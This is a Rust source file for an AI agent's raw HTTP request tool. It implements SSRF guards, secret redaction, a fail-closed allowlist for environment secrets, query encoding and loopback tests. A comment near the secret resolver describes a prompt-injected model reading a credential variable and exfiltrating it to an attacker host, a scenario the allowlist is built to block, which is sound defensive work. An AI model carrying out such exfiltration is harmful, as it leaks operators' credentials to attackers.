//! Tier 1 — `http.request`: raw HTTP protocol access (any method/headers/body).
//!
//! The model gets the status, response headers, and a byte-capped body. Non-2xx responses are a
//! *result*, not an op failure — a 404 comes back with its status, the op succeeds. This is the
//! "APIs → tier 1" surface: for reading a page *as a document* the model should reach for
//! `web.fetch` (tier 2) instead.
//!
//! **The result is a record** (C-304): the canonical `content` is the JSON object
//! `{status, headers, body}`, so an authored flow can select `$resp.body.data.id` instead of
//! scraping one flat string, and the model-facing `view` keeps the rendered `HTTP …` block a person
//! reads. That split is the C-10 precedent — `ToolResult.content` is a `String`, so a structured
//! result travels as canonical JSON with a human `view` beside it, rather than widening
//! `ToolResult` itself.

use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use serde_json::{json, Value};

use flux_core::{percent_encode_component, Error, Result};
use flux_runtime::{Tool, ToolContext, ToolResult};
use flux_spec::{
    AccessKind, Effect, Idempotency, Intent, IntentBehavior, IntentCertainty, IntentRole,
    IntentSet, IntentTarget, Risk, ToolSpec,
};
use flux_system::net::PrivateNetAllow;

use crate::{egress, WebOptions};

/// Cap on the response body handed to the model (bytes, cut on a char boundary). Mirrors the
/// `web.fetch` `MAX_BYTES` precedent.
const MAX_BODY_BYTES: usize = 256 * 1024;
/// Cap on the rendered response-header block.
const MAX_HEADER_BYTES: usize = 8 * 1024;
/// Default request timeout when the caller doesn't set one.
const DEFAULT_TIMEOUT_SECS: u64 = 30;
/// Ceiling on the caller-supplied timeout.
const MAX_TIMEOUT_SECS: u64 = 300;

/// The `http.request` tool. Holds its own `reqwest::Client`, the resolved `web`-scope egress
/// allow-list, and an optional audit sink — the `WebFetchTool` shape, extended with the audit hook
/// tier 1 needs.
pub struct HttpRequestTool {
    http: reqwest::Client,
    private_net: PrivateNetAllow,
    audit: Option<Arc<dyn flux_plugin::EgressAudit>>,
    grant_source: String,
    /// Env-var names this tool may resolve via `{"$secret": "NAME"}`. Fail-closed: a name not on
    /// this list is refused before its value is read (C-76). Resolved once at construction from
    /// `WebOptions.allowed_secrets`, else the `FLUX_WEB_SECRET_ALLOW` env var.
    allowed_secrets: Vec<String>,
}

impl HttpRequestTool {
    pub fn new(opts: &WebOptions) -> Self {
        Self {
            http: egress::redirect_disabled_client(),
            private_net: opts.private_net.clone(),
            audit: opts.audit.clone(),
            grant_source: opts
                .grant_source
                .clone()
                .unwrap_or_else(|| "config:web".to_string()),
            allowed_secrets: opts
                .allowed_secrets
                .clone()
                .unwrap_or_else(secret_allowlist_from_env),
        }
    }

    /// Emit the `PrivateNetAdmit` audit event when the guard just let a request through to a
    /// private/internal host (i.e. the `web` grant admitted what the bare SSRF guard would refuse).
    /// Mirrors the plugin host's `audit_admit`: gated on `host_resolves_private` so only genuine
    /// private admits are recorded.
    fn audit_admit(&self, host: &str) {
        if let Some(audit) = &self.audit {
            if flux_system::net::host_resolves_private(host) {
                audit.record_private_admit("web:http.request", host, &self.grant_source);
            }
        }
    }
}

#[async_trait]
impl Tool for HttpRequestTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "http.request".into(),
            description: "Make an arbitrary HTTP(S) request (any method, headers, and body) and \
                return the record `{status, headers, body}` — `status` a number, `headers` a map \
                keyed by the response header name, `body` the parsed JSON when the response is a \
                JSON object or array and the raw text otherwise. Select a field directly \
                (`$resp.body.data.id`). Use this for APIs and raw protocol \
                access; to read a web page as a readable document prefer `web.fetch`. \
                Private/loopback addresses are blocked unless the `web` egress scope grants them. \
                Pass query parameters as the `query` record — each value is percent-encoded, so \
                never build a query by formatting values into the `url`. A header or query value \
                may be a secret reference `{\"$secret\": \"ENV_NAME\"}`, resolved from the \
                environment and never shown — but only for env-var names the operator has \
                allowlisted; any other name is refused."
                .into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "The absolute http(s) URL to request."},
                    "method": {"type": "string", "description": "HTTP method (default GET)."},
                    "query": {
                        "type": "object",
                        "description": "Query parameters. Each value (string, number, boolean, or a secret reference {\"$secret\": \"ENV_NAME\"}) is percent-encoded before it is appended, so a value carrying & or = cannot add a parameter. A null value is omitted; false and 0 are sent. A key already present in the url is an error.",
                        "additionalProperties": true
                    },
                    "headers": {
                        "type": "object",
                        "description": "Request headers. A value may be a string or a secret reference {\"$secret\": \"ENV_NAME\"}.",
                        "additionalProperties": true
                    },
                    "body": {"type": "string", "description": "Request body, for methods that take one (POST/PUT/PATCH/…)."},
                    "timeout": {"type": "number", "description": "Timeout in seconds (default 30, max 300)."}
                },
                "required": ["url"]
            }),
            output_schema: Some(response_schema()),
            // Arbitrary HTTP can mutate remote state (POST/PUT/DELETE), so this is not the read-only
            // shape `web.fetch` uses: honest Network effect, Medium risk, non-idempotent.
            effects: vec![Effect::Network],
            risk: Risk::Medium,
            idempotency: Idempotency::NonIdempotent,
            access: vec![AccessKind::Network],
            group: None,
        }
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("url")
            .and_then(Value::as_str)
            .map(|url| vec![reported_url(url, params)])
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(url) = params.get("url").and_then(Value::as_str) {
            set.push(Intent {
                behavior: IntentBehavior::NetworkFetch,
                target: IntentTarget::Url {
                    url: reported_url(url, params),
                },
                role: IntentRole::ReadTarget,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let raw = params
            .get("url")
            .and_then(Value::as_str)
            .ok_or_else(|| Error::Other("http.request: `url` required".into()))?;
        let method_str = params
            .get("method")
            .and_then(Value::as_str)
            .unwrap_or("GET")
            .to_ascii_uppercase();
        let method = reqwest::Method::from_bytes(method_str.as_bytes())
            .map_err(|_| Error::Other(format!("http.request: invalid method {method_str:?}")))?;

        // The structured query. Resolved and appended *before* the guard runs, so the guard — and
        // the pinning, and the redirect re-guard — all see the URL that actually goes on the wire.
        let mut resolved_query = Vec::new();
        for (key, value) in query_fields(&params)? {
            let text = match value {
                QueryValue::Text(text) => text,
                QueryValue::Secret(name) => {
                    let secret = resolve_secret_env(&name, ctx, &self.allowed_secrets)?;
                    // The wire carries the *encoded* spelling, and the redactor matches literally,
                    // so both forms are registered — otherwise a percent-encoded token could
                    // survive in a guard/transport error message that quotes the URL.
                    let encoded = percent_encode_component(&secret);
                    ctx.redactor.add_secret(secret.clone());
                    if encoded != secret {
                        ctx.redactor.add_secret(encoded);
                    }
                    secret
                }
            };
            resolved_query.push((key, text));
        }
        let target = append_query(raw, &resolved_query)?;

        // Guard egress (SSRF): resolve the host + block private ranges unless the `web` scope grants
        // them, and capture the vetted addresses so the connection is pinned to them (no rebinding).
        // Runs before any bytes leave the process.
        let (url, pinned) = flux_system::net::guard_url_scoped_pinned(&target, &self.private_net)?;

        let timeout = params
            .get("timeout")
            .and_then(Value::as_f64)
            .map(|s| s.max(0.0) as u64)
            .unwrap_or(DEFAULT_TIMEOUT_SECS)
            .clamp(1, MAX_TIMEOUT_SECS);

        // Headers — resolving `{"$secret": "ENV"}` markers to their env values and seeding the
        // redactor so a token in a header never surfaces readable in output or persisted events.
        let mut request_headers = HeaderMap::new();
        if let Some(headers) = params.get("headers").and_then(Value::as_object) {
            for (name, val) in headers {
                let resolved = resolve_header_value(val, ctx, &self.allowed_secrets)?;
                let name = HeaderName::from_bytes(name.as_bytes()).map_err(|e| {
                    Error::Other(format!("http.request: invalid header name `{name}`: {e}"))
                })?;
                let value = HeaderValue::from_str(&resolved).map_err(|e| {
                    Error::Other(format!(
                        "http.request: invalid value for header `{name}`: {e}"
                    ))
                })?;
                request_headers.insert(name, value);
            }
        }
        let body = params
            .get("body")
            .and_then(Value::as_str)
            .map(|body| body.as_bytes().to_vec());

        let response = egress::send_guarded(
            &self.http,
            egress::GuardedRequest {
                url,
                pinned,
                method,
                headers: request_headers,
                body,
                timeout: Duration::from_secs(timeout),
            },
            "http.request",
            |raw| flux_system::net::guard_url_scoped_pinned(raw, &self.private_net),
            |url| {
                if let Some(host) = url.host_str() {
                    self.audit_admit(host);
                }
            },
        )
        .await?;

        let status = response.status();
        // One walk over the response headers produces BOTH the record's map and the rendered block,
        // under one shared budget — so the two can never disagree about what was kept.
        let headers = collect_headers(response.headers(), |value| ctx.redactor.redact(value));
        let capped = egress::read_body_capped(response, MAX_BODY_BYTES, "http.request").await?;
        let mut body = cap_str(
            String::from_utf8_lossy(&capped.bytes).into_owned(),
            MAX_BODY_BYTES,
        );
        if capped.truncated && !body.ends_with("…[truncated]") {
            body.push_str("\n…[truncated]");
        }
        // A completed request is a successful op: the HTTP status (incl. 4xx/5xx) is *data* in the
        // record — never a tool-level error.
        let view = format!(
            "HTTP {status}\n{}\n{}",
            headers.rendered,
            ctx.redactor.redact(&body)
        );
        let record = json!({
            "status": status.as_u16(),
            "headers": headers.map,
            "body": parse_body(body, |text| ctx.redactor.redact(text)),
        });
        Ok(ToolResult::ok_view(
            serde_json::to_string(&record)
                .map_err(|e| Error::Other(format!("http.request: encoding the response: {e}")))?,
            view,
        ))
    }
}

/// The declared shape of the result record. `body` carries no `type`: it is whatever the response
/// was (see [`parse_body`]), and claiming one would be a lie for half of all responses.
fn response_schema() -> Value {
    json!({
        "type": "object",
        "description": "One completed HTTP response. A non-2xx status is a value here, not an error.",
        "properties": {
            "status": {
                "type": "integer",
                "description": "The HTTP status code, e.g. 200 or 404."
            },
            "headers": {
                "type": "object",
                "description": "Response headers keyed by name (lowercased, as sent). A header sent more than once is joined with `, `. A name carrying a `-` is not reachable with the `$resp.headers.name` sugar — read it with `pick({items: $resp.headers, keys: [\"content-type\"]})`.",
                "additionalProperties": {"type": "string"}
            },
            "body": {
                "description": "The parsed body when it is a JSON object or array; otherwise the raw text (HTML, plain text, an empty string, or a truncated/malformed payload)."
            }
        },
        "required": ["status", "headers", "body"]
    })
}

/// The response body as it goes into the record: **parsed** when it is a JSON object or array,
/// otherwise the raw text.
///
/// That rule is deliberately the interpreter's own (`flux_lang::runtime::jq_parse_input`) rather
/// than a `content-type` sniff. Two reasons: plenty of APIs answer JSON under `text/plain`, so the
/// declared type is not the fact; and a bare JSON scalar (`42`, `"ok"`) reads better as the text it
/// was than as a retyped value, which is exactly the line the language already draws.
///
/// **Nothing here can fail.** An HTML error page, an empty body and a truncated payload all fall
/// through to the string arm, so the record keeps its status and headers and the call still
/// succeeds — the stream-resilience posture (unparseable bytes are counted, not fatal) applied to a
/// response body.
///
/// **Redaction runs AFTER the parse, over the decoded leaves** — never over the JSON text. Two
/// distinct reasons, and both are load-bearing:
///
/// - A registered secret containing a `"`, a `\` or a newline is *escaped* in the JSON text, so a
///   literal match there would miss it. The decoded leaf carries the value as it really is.
/// - The pattern redactor replaces a credential-shaped run between delimiters, and a `"` is one of
///   its delimiters — run over JSON text it can eat the quote's neighbourhood and leave a payload
///   that no longer parses. Redacting leaves cannot corrupt the structure.
fn parse_body(body: String, redact: impl Fn(&str) -> String) -> Value {
    match serde_json::from_str::<Value>(&body) {
        Ok(parsed) if parsed.is_object() || parsed.is_array() => redact_json(parsed, &redact),
        _ => Value::String(redact(&body)),
    }
}

/// Redact every string leaf (and object key) of a parsed body. Numbers and booleans cannot carry a
/// secret; keys are covered because a vendor that echoes a request record back can echo a
/// credential into a key as easily as into a value.
fn redact_json(value: Value, redact: &impl Fn(&str) -> String) -> Value {
    match value {
        Value::String(text) => Value::String(redact(&text)),
        Value::Array(items) => Value::Array(
            items
                .into_iter()
                .map(|item| redact_json(item, redact))
                .collect(),
        ),
        Value::Object(fields) => Value::Object(
            fields
                .into_iter()
                .map(|(key, value)| (redact(&key), redact_json(value, redact)))
                .collect(),
        ),
        other => other,
    }
}

/// The response headers, in both shapes the result needs.
struct ResponseHeaders {
    /// The record's `headers` map.
    map: serde_json::Map<String, Value>,
    /// The `Name: value` block a person reads in the view.
    rendered: String,
}

/// Walk the response headers once, producing the record's map and the rendered block together under
/// one [`MAX_HEADER_BYTES`] budget, so a pathological header set can't blow either and the two can
/// never disagree about what was kept.
///
/// - **Every value is redacted here**, on the raw text, before it is JSON-encoded — a `set-cookie`
///   (or any header) echoing a registered secret must not reach a model-visible surface through the
///   structured map (C-304).
/// - **A header sent more than once is joined with `, `**, the HTTP field-value folding rule. A JSON
///   object cannot hold a repeated key and dropping either copy would silently change the meaning.
///
/// `redact` is passed as a closure rather than the `Redactor` itself so `flux-web` needs no direct
/// dependency on `flux-secret` for one call.
fn collect_headers(headers: &HeaderMap, redact: impl Fn(&str) -> String) -> ResponseHeaders {
    let mut map = serde_json::Map::new();
    let mut rendered = String::new();
    for (name, value) in headers {
        let value = redact(value.to_str().unwrap_or("<binary>"));
        let line = format!("{name}: {value}\n");
        if rendered.len() + line.len() > MAX_HEADER_BYTES {
            rendered.push_str("…[headers truncated]\n");
            break;
        }
        rendered.push_str(&line);
        match map.get_mut(name.as_str()) {
            Some(Value::String(existing)) => {
                existing.push_str(", ");
                existing.push_str(&value);
            }
            _ => {
                map.insert(name.as_str().to_string(), Value::String(value));
            }
        }
    }
    ResponseHeaders { map, rendered }
}

/// A header value: a plain string, or the secret marker `{"$secret": "ENV_NAME"}`.
fn resolve_header_value(val: &Value, ctx: &ToolContext, allowed: &[String]) -> Result<String> {
    if let Some(name) = as_secret_ref(val) {
        return resolve_secret_env(name, ctx, allowed);
    }
    match val {
        Value::String(s) => Ok(s.clone()),
        _ => Err(Error::Other(
            "http.request: header values must be strings or a secret reference {\"$secret\": \"ENV\"}"
                .into(),
        )),
    }
}

/// Read env var `name` and seed it into the redactor — **only if `name` is on the
/// caller-configured allowlist**. Otherwise it is refused before the value is read, so a
/// prompt-injected model cannot name an arbitrary env var (`AWS_SECRET_ACCESS_KEY`, …) and
/// exfiltrate it to an attacker host in one call (C-76). Shared by the header and query paths.
fn resolve_secret_env(name: &str, ctx: &ToolContext, allowed: &[String]) -> Result<String> {
    if !allowed.iter().any(|a| a == name) {
        return Err(Error::Other(format!(
            "http.request: secret env var `{name}` is not on the allowlist and will not be \
             resolved. Add it to `[web] allowed_secrets` (or the FLUX_WEB_SECRET_ALLOW env var) \
             to permit `{{\"$secret\": \"{name}\"}}`."
        )));
    }
    let resolved = std::env::var(name).map_err(|_| {
        Error::Other(format!(
            "http.request: secret env var `{name}` is not set (referenced via {{\"$secret\": \"{name}\"}})"
        ))
    })?;
    ctx.redactor.add_secret(resolved.clone());
    Ok(resolved)
}

/// A parsed `query` field value: a literal scalar already rendered as text, or a secret reference
/// that only the execute path is allowed to resolve.
#[derive(Debug)]
enum QueryValue {
    Text(String),
    /// The env-var name from `{"$secret": "ENV_NAME"}`.
    Secret(String),
}

/// Parse the `query` argument into fields, in sorted key order (`serde_json::Map` is a `BTreeMap`
/// in this build, so one call always builds one URL — a query that reordered between runs could
/// not be cached or matched against an allow-list entry).
///
/// The scalar rules are L-101's, deliberately, so a body and a query behave the same way:
///
/// - **A `null` field is omitted**, which is what lets an unsupplied optional parameter mean "do
///   not send this" without a `when` guard per field.
/// - **`false` and `0` are values and are sent** — they are not "unset".
/// - **A nested field is an error.** A query string has no agreed nesting convention (`a[b]`,
///   `a.b`, repeated `a=`), and a key a vendor does not recognize is accepted and *ignored*,
///   answering `200` — the worst failure available. Refuse rather than guess.
///
/// Nothing is encoded here and no environment is read: this runs on the `permission_subjects` /
/// `intents` path too, which must not touch a secret.
fn query_fields(params: &Value) -> Result<Vec<(String, QueryValue)>> {
    let Some(query) = params.get("query") else {
        return Ok(Vec::new());
    };
    if query.is_null() {
        return Ok(Vec::new());
    }
    let fields = query.as_object().ok_or_else(|| {
        Error::Other(format!(
            "http.request: `query` must be a record of scalar parameters, got {}",
            shape_word(query)
        ))
    })?;
    let mut out = Vec::with_capacity(fields.len());
    for (key, value) in fields {
        let parsed = match value {
            Value::Null => continue,
            Value::String(text) => QueryValue::Text(text.clone()),
            Value::Bool(flag) => QueryValue::Text(flag.to_string()),
            Value::Number(number) => QueryValue::Text(number.to_string()),
            Value::Object(_) | Value::Array(_) => match as_secret_ref(value) {
                Some(name) => QueryValue::Secret(name.to_string()),
                None => {
                    return Err(Error::Other(format!(
                        "http.request: query parameter `{key}` is {}, and a query string has no \
                         agreed nesting convention — a flattened guess is a parameter the vendor \
                         accepts and ignores. Send the flat spelling the vendor documents, one \
                         field per parameter",
                        shape_word(value)
                    )))
                }
            },
        };
        out.push((key.clone(), parsed));
    }
    Ok(out)
}

/// What a value *is*, for a diagnostic that must name the shape rather than dump the value — a
/// query parameter routinely carries a token or a customer identifier. Mirrors `flux-lang`'s
/// `shape_word`, which the form encoder uses for the same reason.
fn shape_word(value: &Value) -> &'static str {
    match value {
        Value::Null => "null",
        Value::Bool(_) => "a boolean",
        Value::Number(_) => "a number",
        Value::String(_) => "text",
        Value::Array(_) => "a list",
        Value::Object(_) => "a record",
    }
}

/// Append `fields` to `raw` as percent-encoded `k=v` pairs.
///
/// **Who owns the `?`:** this function does, and it picks the separator — `?` when the URL has no
/// query yet, `&` when it already does. That is the rule the connector pack's credential placement
/// settled and the one every other appender in the tree follows; contradicting it would put two
/// `?` separators on a URL whose query the vendor then parses as part of a value.
///
/// A fragment is not part of the query, so it is split off, the parameters go before it, and it is
/// put back — otherwise `https://h/p#frag` would grow a `?` *inside* the fragment and send nothing.
///
/// **A key already present in the URL is an error.** A repeated parameter is resolved differently
/// by every server (first wins, last wins, or a list), so silently emitting both would make the
/// request's meaning depend on the vendor — exactly the ambiguity this story exists to remove.
/// (The `query` record itself cannot carry a duplicate: it is a JSON object.)
fn append_query(raw: &str, fields: &[(String, String)]) -> Result<String> {
    if fields.is_empty() {
        return Ok(raw.to_string());
    }
    let (base, fragment) = match raw.split_once('#') {
        Some((base, fragment)) => (base, Some(fragment)),
        None => (raw, None),
    };
    let existing: Vec<&str> = base
        .split_once('?')
        .map(|(_, query)| query)
        .unwrap_or_default()
        .split('&')
        .filter(|pair| !pair.is_empty())
        .map(|pair| pair.split('=').next().unwrap_or(pair))
        .collect();

    let mut out = String::from(base);
    // `None` when the URL already ends on a separator, so `…?` + `a=1` stays one `?`.
    let mut separator = if !base.contains('?') {
        Some('?')
    } else if base.ends_with('?') || base.ends_with('&') {
        None
    } else {
        Some('&')
    };
    for (key, value) in fields {
        let encoded_key = percent_encode_component(key);
        if existing
            .iter()
            .any(|present| *present == encoded_key || *present == key)
        {
            return Err(Error::Other(format!(
                "http.request: query parameter `{key}` is already present in `url`. A repeated \
                 parameter means something different on every server (first wins, last wins, or a \
                 list), so this refuses rather than pick one — set `{key}` in `query` or in the \
                 URL, not both."
            )));
        }
        if let Some(separator) = separator {
            out.push(separator);
        }
        separator = Some('&');
        out.push_str(&encoded_key);
        out.push('=');
        out.push_str(&percent_encode_component(value));
    }
    if let Some(fragment) = fragment {
        out.push('#');
        out.push_str(fragment);
    }
    Ok(out)
}

/// The URL an egress allow-list and the evidence log are shown: the **encoded** URL that will go on
/// the wire — so a subject reflects the request as sent, not the pre-query template.
///
/// Two deliberate departures, both forced by `permission_subjects` being infallible:
///
/// - **A query parameter whose value is a `{"$secret": …}` reference is left out entirely.** This
///   function cannot resolve a secret (it has no `ToolContext`, so no redactor to register it
///   with), and a subject is persisted and matched against grants — so it reports the
///   *unauthenticated* URL, the same property the connector pack preserves for a query-placed
///   credential.
/// - **A malformed `query` falls back to the raw `url`.** `execute` rejects the same input with a
///   real diagnostic before any byte leaves the process, so no request this under-reports is ever
///   actually made.
fn reported_url(raw: &str, params: &Value) -> String {
    let Ok(fields) = query_fields(params) else {
        return raw.to_string();
    };
    let public: Vec<(String, String)> = fields
        .into_iter()
        .filter_map(|(key, value)| match value {
            QueryValue::Text(text) => Some((key, text)),
            QueryValue::Secret(_) => None,
        })
        .collect();
    append_query(raw, &public).unwrap_or_else(|_| raw.to_string())
}

/// Parse the `FLUX_WEB_SECRET_ALLOW` env var into a list of permitted secret env-var names
/// (comma- or whitespace-separated). Unset/empty ⇒ deny-all — the correct fail-closed default so a
/// `$secret` header reference is inert until an operator opts specific names in (C-76).
fn secret_allowlist_from_env() -> Vec<String> {
    std::env::var("FLUX_WEB_SECRET_ALLOW")
        .unwrap_or_default()
        .split([',', ' ', '\t', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_string)
        .collect()
}

/// If `v` is exactly the secret marker `{"$secret": "NAME"}`, return `NAME` (mirrors
/// `flux_lang::program::as_secret_ref`, inlined to avoid an L0 language dep for one predicate).
fn as_secret_ref(v: &Value) -> Option<&str> {
    let obj = v.as_object()?;
    if obj.len() != 1 {
        return None;
    }
    obj.get("$secret")?.as_str()
}

/// Cap a string to `max` bytes, cut on a char boundary (an arbitrary response body is not
/// guaranteed to split cleanly — `String::truncate` panics off a boundary).
fn cap_str(mut s: String, max: usize) -> String {
    if s.len() > max {
        let mut end = max;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        s.truncate(end);
        s.push_str("\n…[truncated]");
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use flux_runtime::ToolContext;
    use flux_system::System;
    use flux_system::Workspace;
    use std::sync::Mutex;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    fn ctx() -> ToolContext {
        let dir = std::env::temp_dir().join(format!(
            "flux-web-http-test-{}-{}",
            std::process::id(),
            // a per-ctx suffix so parallel tests don't share a workspace dir
            NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        ToolContext::new(Arc::new(System::new(Workspace::new(&dir).unwrap())))
    }
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

    /// A one-shot loopback HTTP server: accepts one connection, reads the request, writes a canned
    /// response. Returns its `http://127.0.0.1:<port>` base URL.
    async fn one_shot(status_line: &'static str, body: &'static str) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let _ = sock.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 {status_line}\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.flush().await;
            }
        });
        format!("http://{addr}")
    }

    /// A one-shot loopback server whose response carries `extra_headers` verbatim (each already
    /// `Name: value`, no CRLF) — the seam the record's `headers` map is asserted through.
    async fn one_shot_with_headers(
        status_line: &'static str,
        extra_headers: Vec<String>,
        body: String,
    ) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let _ = sock.read(&mut buf).await;
                let extra: String = extra_headers
                    .iter()
                    .map(|h| format!("{h}\r\n"))
                    .collect::<Vec<_>>()
                    .concat();
                let resp = format!(
                    "HTTP/1.1 {status_line}\r\n{extra}content-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.flush().await;
            }
        });
        format!("http://{addr}")
    }

    /// The result record a completed request produces (`content` is canonical JSON since C-304).
    fn record(result: &ToolResult) -> Value {
        serde_json::from_str(&result.content).unwrap_or_else(|e| {
            panic!("`content` must be the JSON record: {e}: {}", result.content)
        })
    }

    /// A one-shot HTTP server that also reports the raw request bytes it received. Returns its
    /// base URL plus a receiver for the request text, so a test can assert on the request *line*
    /// (i.e. what actually went on the wire) rather than on the response.
    async fn capture_request() -> (String, tokio::sync::oneshot::Receiver<String>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (seen_tx, seen_rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = vec![0u8; 8192];
                let n = sock.read(&mut buf).await.unwrap_or(0);
                let _ = seen_tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
                let _ = sock
                    .write_all(
                        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok",
                    )
                    .await;
                let _ = sock.flush().await;
            }
        });
        (format!("http://{addr}"), seen_rx)
    }

    /// The first line of a captured request (`GET /path?query HTTP/1.1`).
    fn request_line(request: &str) -> String {
        request.lines().next().unwrap_or_default().to_string()
    }

    /// Two one-shot servers: the first redirects to the second, which returns `final_body` and
    /// reports the raw request headers it received. `initial_host` controls the spelling used for
    /// the first URL so tests can grant `localhost` without also granting the `127.0.0.1` target.
    async fn redirect_to_loopback(
        initial_host: &str,
        final_body: &'static str,
    ) -> (String, tokio::sync::oneshot::Receiver<String>) {
        let target = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let target_addr = target.local_addr().unwrap();
        let (seen_tx, seen_rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = target.accept().await {
                let mut buf = vec![0u8; 8192];
                let n = sock.read(&mut buf).await.unwrap_or(0);
                let _ = seen_tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
                let resp = format!(
                    "HTTP/1.1 200 OK\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{final_body}",
                    final_body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
            }
        });

        let source = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let source_port = source.local_addr().unwrap().port();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = source.accept().await {
                let mut buf = [0u8; 2048];
                let _ = sock.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 302 Found\r\nlocation: http://{target_addr}/final\r\ncontent-length: 0\r\nconnection: close\r\n\r\n"
                );
                let _ = sock.write_all(resp.as_bytes()).await;
            }
        });
        (
            format!("http://{initial_host}:{source_port}/start"),
            seen_rx,
        )
    }

    fn tool(private_net: PrivateNetAllow) -> HttpRequestTool {
        HttpRequestTool::new(&WebOptions {
            private_net,
            ..Default::default()
        })
    }

    #[tokio::test]
    async fn not_found_is_a_result_not_a_failure() {
        // Loopback is private, so grant the `web` scope for the test.
        let base = one_shot("404 Not Found", "nope").await;
        let t = tool(PrivateNetAllow::Any);
        let r = t
            .execute(&ctx(), json!({ "url": base }))
            .await
            .expect("a 404 must be a successful op, not an Err");
        assert!(!r.is_error, "a 404 is a result, not a tool error");
        assert_eq!(record(&r)["status"], 404, "the status is a value: {r:?}");
    }

    #[tokio::test]
    async fn private_target_refused_without_grant() {
        let base = one_shot("200 OK", "hi").await;
        let t = tool(PrivateNetAllow::None);
        let err = t.execute(&ctx(), json!({ "url": base })).await;
        assert!(
            err.is_err(),
            "a loopback target must be refused without a `web` grant"
        );
    }

    #[tokio::test]
    async fn redirect_target_is_guarded_before_the_second_request() {
        let (url, _seen) = redirect_to_loopback("localhost", "must not arrive").await;
        let t = tool(PrivateNetAllow::from_hosts(["localhost".to_string()]));
        let err = t
            .execute(&ctx(), json!({ "url": url }))
            .await
            .expect_err("the ungranted loopback redirect target must be refused");
        assert!(
            err.to_string().contains("private/loopback"),
            "the shared SSRF guard names the denial: {err}"
        );
    }

    #[tokio::test]
    async fn cross_origin_redirect_drops_all_caller_headers() {
        let (url, seen) = redirect_to_loopback("127.0.0.1", "ok").await;
        let t = tool(PrivateNetAllow::Any);
        let result = t
            .execute(
                &ctx(),
                json!({
                    "url": url,
                    "headers": {
                        "Authorization": "Bearer caller-secret",
                        "Cookie": "session=caller-secret",
                        "Proxy-Authorization": "Basic caller-secret",
                        "X-Api-Key": "caller-secret",
                        "X-Custom": "also-sensitive"
                    }
                }),
            )
            .await
            .unwrap();
        assert_eq!(record(&result)["body"], "ok");
        let request = seen.await.expect("redirect destination received a request");
        let lower = request.to_ascii_lowercase();
        for name in [
            "authorization:",
            "cookie:",
            "proxy-authorization:",
            "x-api-key:",
            "x-custom:",
        ] {
            assert!(
                !lower.contains(name),
                "cross-origin redirect forwarded {name}: {request}"
            );
        }
    }

    /// Records `record_private_admit` calls so the audit path can be asserted without an event store.
    #[derive(Default)]
    struct RecordingAudit {
        calls: Mutex<Vec<(String, String, String)>>,
    }
    impl flux_plugin::EgressAudit for RecordingAudit {
        fn record_private_admit(&self, caller: &str, host: &str, grant_source: &str) {
            self.calls.lock().unwrap().push((
                caller.to_string(),
                host.to_string(),
                grant_source.to_string(),
            ));
        }
    }

    #[tokio::test]
    async fn private_admit_emits_audit_event() {
        let base = one_shot("200 OK", "ok").await;
        let audit = Arc::new(RecordingAudit::default());
        let t = HttpRequestTool::new(&WebOptions {
            private_net: PrivateNetAllow::Any,
            audit: Some(audit.clone()),
            grant_source: Some("cli:--allow-private-net".into()),
            ..Default::default()
        });
        t.execute(&ctx(), json!({ "url": base })).await.unwrap();
        let calls = audit.calls.lock().unwrap();
        assert_eq!(calls.len(), 1, "one private admit audited");
        assert_eq!(calls[0].0, "web:http.request", "caller label");
        assert_eq!(calls[0].1, "127.0.0.1", "the private host reached");
        assert_eq!(calls[0].2, "cli:--allow-private-net", "grant source label");
    }

    /// Build a tool with an explicit secret allowlist (bypasses the `FLUX_WEB_SECRET_ALLOW` env
    /// fallback so these tests never race on a process-global var).
    fn tool_allowing(private_net: PrivateNetAllow, secrets: &[&str]) -> HttpRequestTool {
        HttpRequestTool::new(&WebOptions {
            private_net,
            allowed_secrets: Some(secrets.iter().map(|s| s.to_string()).collect()),
            ..Default::default()
        })
    }

    #[tokio::test]
    async fn secret_header_is_resolved_and_seeded_into_the_redactor() {
